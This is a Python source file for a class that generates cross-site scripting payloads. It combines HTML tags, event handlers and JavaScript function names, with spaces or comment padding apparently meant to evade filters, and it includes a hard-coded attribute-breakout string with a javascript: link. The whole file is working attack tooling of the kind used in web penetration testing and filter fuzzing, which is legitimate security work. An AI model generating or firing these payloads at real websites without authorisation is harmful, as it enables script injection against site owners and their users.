import database


class Payload:
    def __init__(self):
        self.payloads1 = []
        self.payloads2 = []
        self.payloads3 = []
        self.functions = database.Database().functions
        self.events = database.Database().events
        self.object = 'img'
        self.comment = '/*123*/'
        self.src = 'src=1'
        self.src2 = 'src="1"'
        self.space = ' '
        self.message = '``'
        self.combine1()
        self.combine2()
        self.combine3()
        self.payloads2.append('"><a href=javascript:prompt()')

    def addspace(self, value):
        return value + self.space

    def addcomment(self, value):
        return value + self.comment

    def combine3(self):
        for i in range(0, 2):
            for j in range(0, self.functions.__len__()):
                payload = '''
'''
                if i is 0:
                    payload = self.addspace(payload)
                if i is 1:
                    payload = self.addcomment(payload)
                payload += self.functions[j]
                if i is 0:
                    payload = self.addspace(payload)
                if i is 1:
                    payload = self.addcomment(payload)
                payload += self.message
                if self.space not in payload:
                    self.payloads3.append(payload)
                if self.comment not in payload:
                    self.payloads3.append(payload)

    def combine2(self):
        for i in range(0, 2):
            for j in range(0, self.events.__len__()):
                for k in range(0, self.functions.__len__()):
                    payload = '"'
                    if i is 0:
                        payload = self.addspace(payload)
                    if i is 1:
                        payload = self.addcomment(payload)
                    payload += self.events[j]
                    if i is 0:
                        payload = self.addspace(payload)
                    if i is 1:
                        pass
                    payload += '='
                    if i is 0:
                        payload = self.addspace(payload)
                    if i is 1:
                        payload = self.addcomment(payload)
                    payload += self.functions[k]
                    if i is 0:
                        pass
                    if i is 1:
                        payload = self.addcomment(payload)
                    payload += self.message
                    payload += self.space
                    payload += '"'
                    if self.space not in payload:
                        self.payloads2.append(payload)
                    if self.comment not in payload:
                        self.payloads2.append(payload)

    def combine1(self):
        for i in range(0, 2):
            for j in range(0, 2):
                for k in range(0, self.events.__len__()):
                    for l in range(0, self.functions.__len__()):
                        payload = '<'
                        payload += self.object
                        if i is 0:
                            payload = self.addspace(payload)
                        if i is 1:
                            payload = self.addcomment(payload)
                        if j is 0:
                            payload += self.src
                        if j is 1:
                            payload += self.src2
                        if j is 0:
                            payload = self.addspace(payload)
                        if j is 1:
                            payload = self.addcomment(payload)
                        payload += self.events[k]
                        if i is 0:
                            payload = self.addspace(payload)
                        if i is 1:
                            pass
                        payload += '='
                        if i is 0:
                            payload = self.addspace(payload)
                        if i is 1:
                            payload = self.addcomment(payload)
                        payload += self.functions[l]
                        if i is 0:
                            pass
                        if i is 1:
                            payload = self.addcomment(payload)
                        payload += self.message
                        payload += '>'
                        if self.space not in payload:
                            self.payloads1.append(payload)
                        if self.comment not in payload:
                            self.payloads1.append(payload)
